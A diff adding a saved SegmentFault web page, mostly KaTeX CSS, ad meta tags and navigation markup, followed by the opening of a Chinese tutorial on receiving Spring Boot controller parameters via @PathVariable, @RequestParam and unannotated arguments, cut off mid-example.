+.katex .fontsize-ensurer.reset-size6.size3 {
+  font-size: 0.7em;
+}
+.katex .sizing.reset-size6.size4,
+.katex .fontsize-ensurer.reset-size6.size4 {
+  font-size: 0.8em;
+}
+.katex .sizing.reset-size6.size5,
+.katex .fontsize-ensurer.reset-size6.size5 {
+  font-size: 0.9em;
+}
+.katex .sizing.reset-size6.size6,
+.katex .fontsize-ensurer.reset-size6.size6 {
+  font-size: 1em;
+}
+.katex .sizing.reset-size6.size7,
+.katex .fontsize-ensurer.reset-size6.size7 {
+  font-size: 1.2em;
+}
+.katex .sizing.reset-size6.size8,
+.katex .fontsize-ensurer.reset-size6.size8 {
+  font-size: 1.44em;
+}
+.katex .sizing.reset-size6.size9,
+.katex .fontsize-ensurer.reset-size6.size9 {
+  font-size: 1.728em;
+}
+.katex .sizing.reset-size6.size10,
+.katex .fontsize-ensurer.reset-size6.size10 {
+  font-size: 2.074em;
+}
+.katex .sizing.reset-size6.size11,
+.katex .fontsize-ensurer.reset-size6.size11 {
+  font-size: 2.488em;
+}
+.katex .sizing.reset-size7.size1,
+.katex .fontsize-ensurer.reset-size7.size1 {
+  font-size: 0.41666667em;
+}
+.katex .sizing.reset-size7.size2,
+.katex .fontsize-ensurer.reset-size7.size2 {
+  font-size: 0.5em;
+}
+.katex .sizing.reset-size7.size3,
+.katex .fontsize-ensurer.reset-size7.size3 {
+  font-size: 0.58333333em;
+}
+.katex .sizing.reset-size7.size4,
+.katex .fontsize-ensurer.reset-size7.size4 {
+  font-size: 0.66666667em;
+}
+.katex .sizing.reset-size7.size5,
+.katex .fontsize-ensurer.reset-size7.size5 {
+  font-size: 0.75em;
+}
+.katex .sizing.reset-size7.size6,
+.katex .fontsize-ensurer.reset-size7.size6 {
+  font-size: 0.83333333em;
+}
+.katex .sizing.reset-size7.size7,
+.katex .fontsize-ensurer.reset-size7.size7 {
+  font-size: 1em;
+}
+.katex .sizing.reset-size7.size8,
+.katex .fontsize-ensurer.reset-size7.size8 {
+  font-size: 1.2em;
+}
+.katex .sizing.reset-size7.size9,
+.katex .fontsize-ensurer.reset-size7.size9 {
+  font-size: 1.44em;
+}
+.katex .sizing.reset-size7.size10,
+.katex .fontsize-ensurer.reset-size7.size10 {
+  font-size: 1.72833333em;
+}
+.katex .sizing.reset-size7.size11,
+.katex .fontsize-ensurer.reset-size7.size11 {
+  font-size: 2.07333333em;
+}
+.katex .sizing.reset-size8.size1,
+.katex .fontsize-ensurer.reset-size8.size1 {
+  font-size: 0.34722222em;
+}
+.katex .sizing.reset-size8.size2,
+.katex .fontsize-ensurer.reset-size8.size2 {
+  font-size: 0.41666667em;
+}
+.katex .sizing.reset-size8.size3,
+.katex .fontsize-ensurer.reset-size8.size3 {
+  font-size: 0.48611111em;
+}
+.katex .sizing.reset-size8.size4,
+.katex .fontsize-ensurer.reset-size8.size4 {
+  font-size: 0.55555556em;
+}
+.katex .sizing.reset-size8.size5,
+.katex .fontsize-ensurer.reset-size8.size5 {
+  font-size: 0.625em;
+}
+.katex .sizing.reset-size8.size6,
+.katex .fontsize-ensurer.reset-size8.size6 {
+  font-size: 0.69444444em;
+}
+.katex .sizing.reset-size8.size7,
+.katex .fontsize-ensurer.reset-size8.size7 {
+  font-size: 0.83333333em;
+}
+.katex .sizing.reset-size8.size8,
+.katex .fontsize-ensurer.reset-size8.size8 {
+  font-size: 1em;
+}
+.katex .sizing.reset-size8.size9,
+.katex .fontsize-ensurer.reset-size8.size9 {
+  font-size: 1.2em;
+}
+.katex .sizing.reset-size8.size10,
+.katex .fontsize-ensurer.reset-size8.size10 {
+  font-size: 1.44027778em;
+}
+.katex .sizing.reset-size8.size11,
+.katex .fontsize-ensurer.reset-size8.size11 {
+  font-size: 1.72777778em;
+}
+.katex .sizing.reset-size9.size1,
+.katex .fontsize-ensurer.reset-size9.size1 {
+  font-size: 0.28935185em;
+}
+.katex .sizing.reset-size9.size2,
+.katex .fontsize-ensurer.reset-size9.size2 {
+  font-size: 0.34722222em;
+}
+.katex .sizing.reset-size9.size3,
+.katex .fontsize-ensurer.reset-size9.size3 {
+  font-size: 0.40509259em;
+}
+.katex .sizing.reset-size9.size4,
+.katex .fontsize-ensurer.reset-size9.size4 {
+  font-size: 0.46296296em;
+}
+.katex .sizing.reset-size9.size5,
+.katex .fontsize-ensurer.reset-size9.size5 {
+  font-size: 0.52083333em;
+}
+.katex .sizing.reset-size9.size6,
+.katex .fontsize-ensurer.reset-size9.size6 {
+  font-size: 0.5787037em;
+}
+.katex .sizing.reset-size9.size7,
+.katex .fontsize-ensurer.reset-size9.size7 {
+  font-size: 0.69444444em;
+}
+.katex .sizing.reset-size9.size8,
+.katex .fontsize-ensurer.reset-size9.size8 {
+  font-size: 0.83333333em;
+}
+.katex .sizing.reset-size9.size9,
+.katex .fontsize-ensurer.reset-size9.size9 {
+  font-size: 1em;
+}
+.katex .sizing.reset-size9.size10,
+.katex .fontsize-ensurer.reset-size9.size10 {
+  font-size: 1.20023148em;
+}
+.katex .sizing.reset-size9.size11,
+.katex .fontsize-ensurer.reset-size9.size11 {
+  font-size: 1.43981481em;
+}
+.katex .sizing.reset-size10.size1,
+.katex .fontsize-ensurer.reset-size10.size1 {
+  font-size: 0.24108004em;
+}
+.katex .sizing.reset-size10.size2,
+.katex .fontsize-ensurer.reset-size10.size2 {
+  font-size: 0.28929605em;
+}
+.katex .sizing.reset-size10.size3,
+.katex .fontsize-ensurer.reset-size10.size3 {
+  font-size: 0.33751205em;
+}
+.katex .sizing.reset-size10.size4,
+.katex .fontsize-ensurer.reset-size10.size4 {
+  font-size: 0.38572806em;
+}
+.katex .sizing.reset-size10.size5,
+.katex .fontsize-ensurer.reset-size10.size5 {
+  font-size: 0.43394407em;
+}
+.katex .sizing.reset-size10.size6,
+.katex .fontsize-ensurer.reset-size10.size6 {
+  font-size: 0.48216008em;
+}
+.katex .sizing.reset-size10.size7,
+.katex .fontsize-ensurer.reset-size10.size7 {
+  font-size: 0.57859209em;
+}
+.katex .sizing.reset-size10.size8,
+.katex .fontsize-ensurer.reset-size10.size8 {
+  font-size: 0.69431051em;
+}
+.katex .sizing.reset-size10.size9,
+.katex .fontsize-ensurer.reset-size10.size9 {
+  font-size: 0.83317261em;
+}
+.katex .sizing.reset-size10.size10,
+.katex .fontsize-ensurer.reset-size10.size10 {
+  font-size: 1em;
+}
+.katex .sizing.reset-size10.size11,
+.katex .fontsize-ensurer.reset-size10.size11 {
+  font-size: 1.19961427em;
+}
+.katex .sizing.reset-size11.size1,
+.katex .fontsize-ensurer.reset-size11.size1 {
+  font-size: 0.20096463em;
+}
+.katex .sizing.reset-size11.size2,
+.katex .fontsize-ensurer.reset-size11.size2 {
+  font-size: 0.24115756em;
+}
+.katex .sizing.reset-size11.size3,
+.katex .fontsize-ensurer.reset-size11.size3 {
+  font-size: 0.28135048em;
+}
+.katex .sizing.reset-size11.size4,
+.katex .fontsize-ensurer.reset-size11.size4 {
+  font-size: 0.32154341em;
+}
+.katex .sizing.reset-size11.size5,
+.katex .fontsize-ensurer.reset-size11.size5 {
+  font-size: 0.36173633em;
+}
+.katex .sizing.reset-size11.size6,
+.katex .fontsize-ensurer.reset-size11.size6 {
+  font-size: 0.40192926em;
+}
+.katex .sizing.reset-size11.size7,
+.katex .fontsize-ensurer.reset-size11.size7 {
+  font-size: 0.48231511em;
+}
+.katex .sizing.reset-size11.size8,
+.katex .fontsize-ensurer.reset-size11.size8 {
+  font-size: 0.57877814em;
+}
+.katex .sizing.reset-size11.size9,
+.katex .fontsize-ensurer.reset-size11.size9 {
+  font-size: 0.69453376em;
+}
+.katex .sizing.reset-size11.size10,
+.katex .fontsize-ensurer.reset-size11.size10 {
+  font-size: 0.83360129em;
+}
+.katex .sizing.reset-size11.size11,
+.katex .fontsize-ensurer.reset-size11.size11 {
+  font-size: 1em;
+}
+.katex .delimsizing.size1 {
+  font-family: KaTeX_Size1;
+}
+.katex .delimsizing.size2 {
+  font-family: KaTeX_Size2;
+}
+.katex .delimsizing.size3 {
+  font-family: KaTeX_Size3;
+}
+.katex .delimsizing.size4 {
+  font-family: KaTeX_Size4;
+}
+.katex .delimsizing.mult .delim-size1 > span {
+  font-family: KaTeX_Size1;
+}
+.katex .delimsizing.mult .delim-size4 > span {
+  font-family: KaTeX_Size4;
+}
+.katex .nulldelimiter {
+  display: inline-block;
+  width: 0.12em;
+}
+.katex .delimcenter {
+  position: relative;
+}
+.katex .op-symbol {
+  position: relative;
+}
+.katex .op-symbol.small-op {
+  font-family: KaTeX_Size1;
+}
+.katex .op-symbol.large-op {
+  font-family: KaTeX_Size2;
+}
+.katex .op-limits > .vlist-t {
+  text-align: center;
+}
+.katex .accent > .vlist-t {
+  text-align: center;
+}
+.katex .accent .accent-body {
+  position: relative;
+}
+.katex .accent .accent-body:not(.accent-full) {
+  width: 0;
+}
+.katex .overlay {
+  display: block;
+}
+.katex .mtable .vertical-separator {
+  display: inline-block;
+  min-width: 1px;
+}
+.katex .mtable .arraycolsep {
+  display: inline-block;
+}
+.katex .mtable .col-align-c > .vlist-t {
+  text-align: center;
+}
+.katex .mtable .col-align-l > .vlist-t {
+  text-align: left;
+}
+.katex .mtable .col-align-r > .vlist-t {
+  text-align: right;
+}
+.katex .svg-align {
+  text-align: left;
+}
+.katex svg {
+  display: block;
+  position: absolute;
+  width: 100%;
+  height: inherit;
+  fill: currentColor;
+  stroke: currentColor;
+  fill-rule: nonzero;
+  fill-opacity: 1;
+  stroke-width: 1;
+  stroke-linecap: butt;
+  stroke-linejoin: miter;
+  stroke-miterlimit: 4;
+  stroke-dasharray: none;
+  stroke-dashoffset: 0;
+  stroke-opacity: 1;
+}
+.katex svg path {
+  stroke: none;
+}
+.katex img {
+  border-style: none;
+  min-width: 0;
+  min-height: 0;
+  max-width: none;
+  max-height: none;
+}
+.katex .stretchy {
+  width: 100%;
+  display: block;
+  position: relative;
+  overflow: hidden;
+}
+.katex .stretchy::before,
+.katex .stretchy::after {
+  content: "";
+}
+.katex .hide-tail {
+  width: 100%;
+  position: relative;
+  overflow: hidden;
+}
+.katex .halfarrow-left {
+  position: absolute;
+  left: 0;
+  width: 50.2%;
+  overflow: hidden;
+}
+.katex .halfarrow-right {
+  position: absolute;
+  right: 0;
+  width: 50.2%;
+  overflow: hidden;
+}
+.katex .brace-left {
+  position: absolute;
+  left: 0;
+  width: 25.1%;
+  overflow: hidden;
+}
+.katex .brace-center {
+  position: absolute;
+  left: 25%;
+  width: 50%;
+  overflow: hidden;
+}
+.katex .brace-right {
+  position: absolute;
+  right: 0;
+  width: 25.1%;
+  overflow: hidden;
+}
+.katex .x-arrow-pad {
+  padding: 0 0.5em;
+}
+.katex .x-arrow,
+.katex .mover,
+.katex .munder {
+  text-align: center;
+}
+.katex .boxpad {
+  padding: 0 0.3em 0 0.3em;
+}
+.katex .fbox,
+.katex .fcolorbox {
+  box-sizing: border-box;
+  border: 0.04em solid;
+}
+.katex .cancel-pad {
+  padding: 0 0.2em 0 0.2em;
+}
+.katex .cancel-lap {
+  margin-left: -0.2em;
+  margin-right: -0.2em;
+}
+.katex .sout {
+  border-bottom-style: solid;
+  border-bottom-width: 0.08em;
+}
+.katex-display {
+  display: block;
+  margin: 1em 0;
+  text-align: center;
+}
+.katex-display > .katex {
+  display: block;
+  text-align: center;
+  white-space: nowrap;
+}
+.katex-display > .katex > .katex-html {
+  display: block;
+  position: relative;
+}
+.katex-display > .katex > .katex-html > .tag {
+  position: absolute;
+  right: 0;
+}
+.katex-display.leqno > .katex > .katex-html > .tag {
+  left: 0;
+  right: auto;
+}
+.katex-display.fleqn > .katex {
+  text-align: left;
+  padding-left: 2em;
+}
+</style><meta http-equiv="origin-trial" content="A+b/H0b8RPXNaJgaNFpO0YOFuGK6myDQXlwnJB3SwzvNMfcndat4DZYMrP4ClJIzYWo3/yP2S+8FTZ/lpqbPAAEAAABueyJvcmlnaW4iOiJodHRwczovL2ltYXNkay5nb29nbGVhcGlzLmNvbTo0NDMiLCJmZWF0dXJlIjoiVHJ1c3RUb2tlbnMiLCJleHBpcnkiOjE2MjYyMjA3OTksImlzVGhpcmRQYXJ0eSI6dHJ1ZX0="><meta http-equiv="origin-trial" content="A9ZgbRtm4pU3oZiuNzOsKcC8ppFSZdcjP2qYcdQrFKVzkmiWH1kdYY1Mi9x7G8+PS8HV9Ha9Cz0gaMdKsiVZIgMAAAB7eyJvcmlnaW4iOiJodHRwczovL2RvdWJsZWNsaWNrLm5ldDo0NDMiLCJmZWF0dXJlIjoiVHJ1c3RUb2tlbnMiLCJleHBpcnkiOjE2MjYyMjA3OTksImlzU3ViZG9tYWluIjp0cnVlLCJpc1RoaXJkUGFydHkiOnRydWV9"><meta http-equiv="origin-trial" content="AxL6oBxcpn5rQDPKSAs+d0oxNyJYq2/4esBUh3Yx5z8QfcLu+AU8iFCXYRcr/CEEfDnkxxLTsvXPJFQBxHfvkgMAAACBeyJvcmlnaW4iOiJodHRwczovL2dvb2dsZXRhZ3NlcnZpY2VzLmNvbTo0NDMiLCJmZWF0dXJlIjoiVHJ1c3RUb2tlbnMiLCJleHBpcnkiOjE2MjYyMjA3OTksImlzU3ViZG9tYWluIjp0cnVlLCJpc1RoaXJkUGFydHkiOnRydWV9"><meta http-equiv="origin-trial" content="A9KPtG5kl3oLTk21xqynDPGQ5t18bSOpwt0w6kGa6dEWbuwjpffmdUpR3W+faZDubGT+KIk2do0BX2ca16x8qAcAAACBeyJvcmlnaW4iOiJodHRwczovL2dvb2dsZXN5bmRpY2F0aW9uLmNvbTo0NDMiLCJmZWF0dXJlIjoiVHJ1c3RUb2tlbnMiLCJleHBpcnkiOjE2MjYyMjA3OTksImlzU3ViZG9tYWluIjp0cnVlLCJpc1RoaXJkUGFydHkiOnRydWV9"><meta http-equiv="origin-trial" content="A3HucHUo1oW9s+9kIKz8mLkbcmdaj5lxt3eiIMp1Nh49dkkBlg1Fhg4Fd/r0vL69mRRA36YutI9P/lJUfL8csQoAAACFeyJvcmlnaW4iOiJodHRwczovL2RvdWJsZWNsaWNrLm5ldDo0NDMiLCJmZWF0dXJlIjoiQ29udmVyc2lvbk1lYXN1cmVtZW50IiwiZXhwaXJ5IjoxNjI2MjIwNzk5LCJpc1N1YmRvbWFpbiI6dHJ1ZSwiaXNUaGlyZFBhcnR5Ijp0cnVlfQ=="><meta http-equiv="origin-trial" content="A0OysezhLoCRYomumeYlubLurZTCmsjTb087OvtCy95jNM65cfEsbajrJnhaGwiTxhz38ZZbm+UhUwQuXfVPTg0AAACLeyJvcmlnaW4iOiJodHRwczovL2dvb2dsZXN5bmRpY2F0aW9uLmNvbTo0NDMiLCJmZWF0dXJlIjoiQ29udmVyc2lvbk1lYXN1cmVtZW50IiwiZXhwaXJ5IjoxNjI2MjIwNzk5LCJpc1N1YmRvbWFpbiI6dHJ1ZSwiaXNUaGlyZFBhcnR5Ijp0cnVlfQ=="><meta http-equiv="origin-trial" content="AxoOxdZQmIoA1WeAPDixRAeWDdgs7ZtVFfH2y19ziTgD1iaHE5ZGz2UdSjubkWvob9C5PrjUfkWi4ZSLgWk3Xg8AAACLeyJvcmlnaW4iOiJodHRwczovL2dvb2dsZXRhZ3NlcnZpY2VzLmNvbTo0NDMiLCJmZWF0dXJlIjoiQ29udmVyc2lvbk1lYXN1cmVtZW50IiwiZXhwaXJ5IjoxNjI2MjIwNzk5LCJpc1N1YmRvbWFpbiI6dHJ1ZSwiaXNUaGlyZFBhcnR5Ijp0cnVlfQ=="><meta http-equiv="origin-trial" content="A7+rMYR5onPnACrz+niKSeFdH3xw1IyHo2AZSHmxrofRk9w4HcQPMYcpBUKu6OQ6zsdxf4m/vqa6tG6Na4OLpAQAAAB4eyJvcmlnaW4iOiJodHRwczovL2ltYXNkay5nb29nbGVhcGlzLmNvbTo0NDMiLCJmZWF0dXJlIjoiQ29udmVyc2lvbk1lYXN1cmVtZW50IiwiZXhwaXJ5IjoxNjI2MjIwNzk5LCJpc1RoaXJkUGFydHkiOnRydWV9"><meta http-equiv="origin-trial" content="AwfG8hAcHnPa/kJ1Co0EvG/K0F9l1s2JZGiDLt2mhC3QI5Fh4qmsmSwrWObZFbRC9ieDaSLU6lHRxhGUF/i9sgoAAACBeyJvcmlnaW4iOiJodHRwczovL2RvdWJsZWNsaWNrLm5ldDo0NDMiLCJmZWF0dXJlIjoiSW50ZXJlc3RDb2hvcnRBUEkiLCJleHBpcnkiOjE2MjYyMjA3OTksImlzU3ViZG9tYWluIjp0cnVlLCJpc1RoaXJkUGFydHkiOnRydWV9"><meta http-equiv="origin-trial" content="AwQ7dCmHkvR6FuOFxAuNnktYSQrGbL4dF+eBkrwNLALc69Wr//PnO1yzns3pjUoCaYbKHtVcnng2hU+8OUm0PAYAAACHeyJvcmlnaW4iOiJodHRwczovL2dvb2dsZXN5bmRpY2F0aW9uLmNvbTo0NDMiLCJmZWF0dXJlIjoiSW50ZXJlc3RDb2hvcnRBUEkiLCJleHBpcnkiOjE2MjYyMjA3OTksImlzU3ViZG9tYWluIjp0cnVlLCJpc1RoaXJkUGFydHkiOnRydWV9"><meta http-equiv="origin-trial" content="AysVDPGQTLD/Scn78x4mLwB1tMfje5jwUpAAzGRpWsr1NzoN7MTFhT3ClmImi2svDZA7V6nWGIV8YTPsSRTe0wYAAACHeyJvcmlnaW4iOiJodHRwczovL2dvb2dsZXRhZ3NlcnZpY2VzLmNvbTo0NDMiLCJmZWF0dXJlIjoiSW50ZXJlc3RDb2hvcnRBUEkiLCJleHBpcnkiOjE2MjYyMjA3OTksImlzU3ViZG9tYWluIjp0cnVlLCJpc1RoaXJkUGFydHkiOnRydWV9"><link rel="preload" href="spring-boot-route%EF%BC%88%E4%B8%80%EF%BC%89Controller%E6%8E%A5%E6%94%B6%E5%8F%82%E6%95%B0%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F%20-%20SegmentFault%20%E6%80%9D%E5%90%A6_files/integrator.js" as="script"><script type="text/javascript" src="spring-boot-route%EF%BC%88%E4%B8%80%EF%BC%89Controller%E6%8E%A5%E6%94%B6%E5%8F%82%E6%95%B0%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F%20-%20SegmentFault%20%E6%80%9D%E5%90%A6_files/integrator.js"></script><link rel="preload" href="spring-boot-route%EF%BC%88%E4%B8%80%EF%BC%89Controller%E6%8E%A5%E6%94%B6%E5%8F%82%E6%95%B0%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F%20-%20SegmentFault%20%E6%80%9D%E5%90%A6_files/integrator.js" as="script"><script type="text/javascript" src="spring-boot-route%EF%BC%88%E4%B8%80%EF%BC%89Controller%E6%8E%A5%E6%94%B6%E5%8F%82%E6%95%B0%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F%20-%20SegmentFault%20%E6%80%9D%E5%90%A6_files/integrator.js"></script></head>
+  <body>
+    <div id="root"><style></style><div class="d-none d-lg-block text-center"><div id="OA_holder_5" class="ad-container" style="display:none"><div id="beacon_c737f60c96" style="position: absolute; left: 0px; top: 0px; visibility: hidden;"><img src="spring-boot-route%EF%BC%88%E4%B8%80%EF%BC%89Controller%E6%8E%A5%E6%94%B6%E5%8F%82%E6%95%B0%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F%20-%20SegmentFault%20%E6%80%9D%E5%90%A6_files/lg_007.gif" alt="" style="width: 0px; height: 0px;" width="0" height="0"></div>
+</div></div><div id="root-top-container"></div><nav id="sf-header" class="bg-white shadow-sm sticky-top navbar navbar-expand-lg navbar-light"><div class="position-relative container"><div class="left-wrap d-flex justify-content-center"><a href="https://segmentfault.com/" class="navbar-brand"><img src="spring-boot-route%EF%BC%88%E4%B8%80%EF%BC%89Controller%E6%8E%A5%E6%94%B6%E5%8F%82%E6%95%B0%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F%20-%20SegmentFault%20%E6%80%9D%E5%90%A6_files/logo-b.svg" class="d-inline-block" alt="segmentfault" width="139" height="26"></a></div><a class="btn btn-primary d-lg-none ml-auto mr-2" href="https://segmentfault.com/user/login">注册登录</a><button aria-controls="basic-navbar-nav" type="button" aria-label="Toggle navigation" class="navbar-toggler collapsed"><span class="navbar-toggler-icon"></span></button><div class="justify-content-between navbar-collapse collapse" id="basic-navbar-nav"><div class="font-weight-bold navbar-nav"><a href="https://segmentfault.com/" data-rb-event-key="/" class="nav-link">首页</a><a href="https://segmentfault.com/questions" data-rb-event-key="/questions" class="nav-link">问答</a><a href="https://segmentfault.com/blogs" data-rb-event-key="/blogs" class="nav-link">专栏</a><a href="https://ke.segmentfault.com/" target="_blank" rel="noreferrer" class="nav-link">课程<i class="ml-1 text-danger fas fa-fire-alt" style="width:0.88rem;vertical-align:text-bottom"></i></a><a href="https://segmentfault.com/events" data-rb-event-key="/events" class="nav-link">活动</a><div class="hover-down  nav-item dropdown"><a aria-haspopup="true" aria-expanded="false" id="basic-nav-dropdown" href="#" class="dropdown-toggle nav-link" role="button">发现</a></div></div><form action="/search" class="d-none d-xl-block px-3 header-search___28AtS form-inline"><input type="text" name="q" placeholder="搜索关键字" aria-label="搜索" class="mr-sm-2 w-100 form-control"></form><nav class="p-0 navbar navbar-expand navbar-light"><div class="d-none d-lg-flex mr-2 mr-md-0 nav-item"><a href="https://segmentfault.com/user/login" class="btn btn-primary">注册登录</a></div></nav></div></div></nav><div class="d-none d-xl-flex justify-content-center"><div id="OA_holder_2" class="ad-container" style="display:block"><div id="beacon_2a855146a5" style="position: absolute; left: 0px; top: 0px; visibility: hidden;"><img src="spring-boot-route%EF%BC%88%E4%B8%80%EF%BC%89Controller%E6%8E%A5%E6%94%B6%E5%8F%82%E6%95%B0%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F%20-%20SegmentFault%20%E6%80%9D%E5%90%A6_files/lg_002.gif" alt="" style="width: 0px; height: 0px;" width="0" height="0"></div>
+</div></div><div class="article-content container"><nav aria-label="breadcrumb" class="font-size-14 px-0 my-0 mx-4 mx-md-0"><ol class="breadcrumb bg-transparent"><li class="breadcrumb-item"><a href="https://segmentfault.com/">首页</a></li><li class="breadcrumb-item"><a href="https://segmentfault.com/blogs">专栏</a></li><li class="breadcrumb-item"><a href="https://segmentfault.com/t/java/blogs">java</a></li><li class="breadcrumb-item active" aria-current="page">文章详情</li></ol></nav><div class="row"><div class="col-12 col-xl w-0 col"><div class="sticky-wrap sticky-top functional-area-left d-none d-xl-flex justify-content-center pt-5 functional-area-left2"><div role="group" class="align-items-center btn-group-vertical"><button aria-label="点赞" type="button" class="func-btn mainLike  sflex-center shadow-sm rounded-circle main-lg-Like mb-3 btn btn-outline-primary"><i class="far fa-thumbs-up"></i><span class="mainLikeNum ">10</span></button><button aria-label="收藏" type="button" class="func-btn sflex-center rounded-circle mb-2 btn btn-outline-secondary"><i class="far fa-bookmark"></i></button><a class="func-btn sflex-center btn btn-outline-secondary rounded-circle mb-2" href="#comment-area" aria-label="评论"><i class="far fa-comment-alt-lines"></i></a><div class="dropdown"><a href="###" class="func-btn nav-tab-item  rounded-pill btn btn-outline-secondary sflex-center rounded-circle dropdown-toggle" aria-label="分享"><i class="far fa-share-alt"></i></a></div></div></div><canvas class="qrcode" height="116" width="116" style="height: 116px; width: 116px;" hidden=""></canvas><div class="mb-4 card"><div class="p-lg-30 position-relative card-body"><h1 class="h2 mb-3"><a href="https://segmentfault.com/a/1190000025188239" class="text-body">spring-boot-route（一）Controller接收参数的几种方式</a></h1><div class="d-flex align-items-center justify-content-between flex-wrap mb-4"><div class="d-flex align-items-center"><a href="https://segmentfault.com/u/javatrip" class="d-flex align-items-center"><picture class="mr-2 d-sm-block d-none"><img src="spring-boot-route%EF%BC%88%E4%B8%80%EF%BC%89Controller%E6%8E%A5%E6%94%B6%E5%8F%82%E6%95%B0%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F%20-%20SegmentFault%20%E6%80%9D%E5%90%A6_files/2295617052-5ebaac9a8df71_huge128.webp" alt="" class="d-inline-block rounded-circle" width="32"></picture><strong class="align-self-center font-size-14">Java旅途</strong></a><time class="text-secondary font-size-14" datetime="2020-10-02T11:30:55.000Z" itemprop="datePublished" style="margin-left:12px">发布于 <!-- -->2020-10-02 </time></div></div><div id="OA_holder_25" class="ad-container" style="display:block"><div id="beacon_09cd56d84f" style="position: absolute; left: 0px; top: 0px; visibility: hidden;"><img src="spring-boot-route%EF%BC%88%E4%B8%80%EF%BC%89Controller%E6%8E%A5%E6%94%B6%E5%8F%82%E6%95%B0%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F%20-%20SegmentFault%20%E6%80%9D%E5%90%A6_files/lg_003.gif" alt="" style="width: 0px; height: 0px;" width="0" height="0"></div>
+</div><article class="article fmt article-content "><p>Controller接收参数的常用方式总体可以分为三类。第一类是Get请求通过拼接url进行传递，第二类是Post请求通过请求体进行传递，第三类是通过请求头部进行参数传递。</p><h3 id="item-0-1">1 @PathVariable接收参数</h3><p>请求方式：localhost:7001/param/123</p><p>请求示例：</p><p><span class="img-wrap"><img class="lazy entered loaded exited" referrerpolicy="no-referrer" data-src="/img/remote/1460000025188242" alt="" title="" data-ll-status="loaded" src="spring-boot-route%EF%BC%88%E4%B8%80%EF%BC%89Controller%E6%8E%A5%E6%94%B6%E5%8F%82%E6%95%B0%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F%20-%20SegmentFault%20%E6%80%9D%E5%90%A6_files/1460000025188242.webp"></span></p><p>代码示例：</p><div class="widget-codetool" style="display:none;">
+        <div class="widget-codetool--inner">
+        <button type="button" class="btn btn-dark far fa-copy rounded-0 sflex-center copyCode" data-toggle="tooltip" data-placement="top" data-clipboard-text="@GetMapping(&quot;{id}&quot;)
+public String getPathVariable(@PathVariable String id){
+    return &quot;id=&quot;+id;
+}" title="" data-original-title="复制"></button>
+        </div>
+        </div><pre class="java hljs"><code class="java"><span class="hljs-meta">@GetMapping("{id}")</span>
+<span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">getPathVariable</span><span class="hljs-params">(<span class="hljs-meta">@PathVariable</span> String id)</span></span>{
+    <span class="hljs-keyword">return</span> <span class="hljs-string">"id="</span>+id;
+}</code></pre><h3 id="item-0-2">2 @RequestParam接收参数</h3><p>使用这个注解需要注意两个点，一是加了这个参数后则请求中必须传递这个参数，二是@RequestParam这个注解可以指定名字，请求参数必须和指定的这个名字相同，如果不指定，则默认为具体参数名。</p><p>请求方式：localhost:7001/param/getParam?myId=18</p><p>请求示例：</p><p><span class="img-wrap"><img class="lazy entered loaded exited" referrerpolicy="no-referrer" data-src="/img/remote/1460000025188243" alt="" title="" data-ll-status="loaded" src="spring-boot-route%EF%BC%88%E4%B8%80%EF%BC%89Controller%E6%8E%A5%E6%94%B6%E5%8F%82%E6%95%B0%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F%20-%20SegmentFault%20%E6%80%9D%E5%90%A6_files/1460000025188243.webp"></span></p><p>代码示例：</p><div class="widget-codetool" style="display:none;">
+        <div class="widget-codetool--inner">
+        <button type="button" class="btn btn-dark far fa-copy rounded-0 sflex-center copyCode" data-toggle="tooltip" data-placement="top" data-clipboard-text="@GetMapping(&quot;getParam&quot;)
+public String getRequestParam(@RequestParam(&quot;myId&quot;) String id){
+    return &quot;id=&quot;+id;
+}" title="" data-original-title="复制"></button>
+        </div>
+        </div><pre class="java hljs"><code class="java"><span class="hljs-meta">@GetMapping("getParam")</span>
+<span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">getRequestParam</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam("myId")</span> String id)</span></span>{
+    <span class="hljs-keyword">return</span> <span class="hljs-string">"id="</span>+id;
+}</code></pre><h3 id="item-0-3">3 无注解传参</h3><p>这种方式和2对比，最大的区别就是这个参数不是必传的，请求路径上可以不传递。</p><p>请求方式：localhost:7001/param/getString?id=18</p><p>请求示例：</p><p><span class="img-wrap"><img class="lazy entered loaded exited" referrerpolicy="no-referrer" data-src="/img/remote/1460000025188245" alt="" title="" data-ll-status="loaded" src="spring-boot-route%EF%BC%88%E4%B8%80%EF%BC%89Controller%E6%8E%A5%E6%94%B6%E5%8F%82%E6%95%B0%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F%20-%20SegmentFault%20%E6%80%9D%E5%90%A6_files/1460000025188245.webp"></span></p><p>代码示例：</p><div class="widget-codetool" style="display:none;">
+        <div class="widget-codetool--inner">
+        <button type="button" class="btn btn-dark far fa-copy rounded-0 sflex-center copyCode" data-toggle="tooltip" data-placement="top" data-clipboard-text="@GetMapping(&quot;getString&quot;)
+public String getString(String id){
+    return &quot;id=&quot;+id;
+}" title="" data-original-title="复制"></button>
+        </div>
+        </div><pre class="java hljs"><code class="java"><span class="hljs-meta">@GetMapping("getString")</span>
+<span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">getString</span><span class="hljs-params">(String id)</span></span>{
+    <span class="hljs-keyword">return</span> <span class="hljs-string">"id="</span>+id;
